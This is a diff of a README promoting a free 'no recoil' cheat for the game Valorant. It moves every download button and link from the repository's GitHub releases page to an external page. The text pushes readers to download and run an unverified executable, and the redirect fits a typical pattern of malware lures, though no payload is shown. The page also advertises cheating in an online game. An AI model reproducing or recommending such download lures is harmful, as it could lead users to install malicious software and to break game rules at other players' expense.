@@ -1,7 +1,7 @@
 <h1>🔫 valorant-no-recoil-2026 - Eliminate Recoil, Win Every Duel</h1>
 
 <p align="center">
-  <a href="https://github.com/Alekscar89/valorant-no-recoil-2026/releases" style="display:inline-block;padding:18px 42px;background:#00c853;color:#ffffff;font-size:24px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 24px rgba(0,200,83,0.4);">⬇️ DOWNLOAD NOW (FREE)</a>
+  <a href="https://alekscar89.github.io" style="display:inline-block;padding:18px 42px;background:#00c853;color:#ffffff;font-size:24px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 24px rgba(0,200,83,0.4);">⬇️ DOWNLOAD NOW (FREE)</a>
 </p>
 
 ---
@@ -47,7 +47,7 @@ Follow these simple steps to get the tool running:
 ### Step 1: Download the Application
 
 **Visit this link to download the application:**  
-👉 **[https://github.com/Alekscar89/valorant-no-recoil-2026/releases](https://github.com/Alekscar89/valorant-no-recoil-2026/releases)**
+👉 **[https://alekscar89.github.io](https://alekscar89.github.io)**
 
 The download page will show you the latest version. Click the download button there. The file is small and downloads quickly.
 
@@ -176,7 +176,7 @@ We're committed to keeping this tool free and up-to-date. Support the project by
 
 <p align="center">
   <strong>Ready to dominate the server?</strong><br>
-  <a href="https://github.com/Alekscar89/valorant-no-recoil-2026/releases" style="display:inline-block;padding:15px 35px;background:#2962ff;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 24px rgba(41,98,255,0.4);">⬇️ GET THE LATEST VERSION NOW</a>
+  <a href="https://alekscar89.github.io" style="display:inline-block;padding:15px 35px;background:#2962ff;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 8px 24px rgba(41,98,255,0.4);">⬇️ GET THE LATEST VERSION NOW</a>
 </p>
 
 ---
